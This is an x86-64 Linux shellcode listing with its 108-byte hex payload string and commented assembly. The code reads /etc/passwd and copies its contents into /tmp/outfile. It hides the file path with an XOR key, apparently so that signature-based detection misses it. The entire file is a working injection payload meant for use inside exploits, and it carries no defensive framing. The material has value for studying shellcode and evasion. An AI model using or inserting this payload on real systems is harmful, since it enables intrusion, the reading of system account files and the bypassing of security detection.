; Author: Robert Catalin Raducioiu
; Shellcode length: 108 bytes
; Shellcode: "\x31\xc9\x51\x51\x5e\x56\x58\x04\x02\x48\xbf\xe9\x8e\xdf\xa5\xed\x50\xb7\x58\xb9\x9a\xfd\xa8\xc1\x31\xf9\x51\x48\xb9\xc6\xa1\xba\xd1\x8e\x7f\xc7\x39\x48\x31\xf9\x51\x54\x5f\x0f\x05\x48\x97\x31\xc0\x99\x48\x89\xe6\x66\xff\xca\x0f\x05\x48\x89\xc3\x54\x41\x58\x31\xc0\x68\x66\x69\x6c\x65\x48\xb9\x2f\x74\x6d\x70\x2f\x6f\x75\x74\x51\x50\x5e\x04\x02\x48\x89\xe7\x6a\x66\x66\x5e\x0f\x05\x48\x97\x31\xc0\xff\xc0\x41\x50\x5e\x53\x5a\x0f\x05"

global _start

section .text

_start:

OpenPasswdFile:

    ; clear RCX and push it to the stack
    ; to act as a string terminator
    xor ecx, ecx
    push rcx

    ; clear RSI and RAX
    push rcx
    pop rsi

    push rsi
    pop rax

    ; set RAX to 2 (syscall open)
    add al, 2

    ; XOR key
    mov rdi, 0x58b750eda5df8ee9

    ; string "sswd" xored
    mov ecx, 0xc1a8fd9a
    xor ecx, edi
    push rcx

    ; string "//etc/pa" xored
    mov rcx, 0x39c77f8ed1baa1c6
    xor rcx, rdi

    ; store the pointer to the string into RDI
    push rcx
    push rsp
    pop rdi

    ; invoke syscall open
    syscall

ReadPasswdFile:

    ; 1st argument of open: file descriptor of
    ; the file to read
    xchg rax, rdi

    ; clear RAX and RDX
    xor eax, eax
    cdq

    ; 2nd argument of read: base address of the
    ; buffer that will store the bytes read from
    ; the file
    mov rsi, rsp

    ; 3rd argument of read: maximum number of
    ; bytes to read
    ; set DX to 0xffff
    dec dx
    
    ; invoke syscall read
    syscall

CreateTempFile:

    ; save the number of bytes read into RCX
    ; (for later usage)
    mov rbx, rax

    ; save into R8 the pointer to the buffer
    ; containing the bytes read from the file
    push rsp
    pop r8

    ; clear RAX
    xor eax, eax

    ; push the string "/tmp/outfile" to the stack
    push DWORD 0x656c6966
    mov rcx, 0x74756f2f706d742f
    push rcx

    ; clear RSI
    push rax
    pop rsi
    
    ; set RAX to 2 (syscall open)
    add al, 2

    ; 1st argument of open: pointer to the file
    ; to open (/tmp/outfile)
    mov rdi, rsp
    
    ; 2nd argument of open: flags to use when
    ; opening the file
    ; in this case: O_RDWR|O_CREAT|0x24
    push 0x66
    pop si

    ; invoke syscall open
    syscall

WriteTempFile:

    ; 1st argument of syscall write: file
    ; descriptor of the file in which to write
    xchg rdi, rax

    ; set RAX to 1 (syscall write)
    xor eax, eax
    inc eax

    ; 2nd argument of write: pointer to the
    ; buffer containing the bytes to write
    push r8
    pop rsi

    ; 3rd argument of write: number of bytes
    ; to write
    push rbx
    pop rdx

    ; invoke syscall write
    syscall
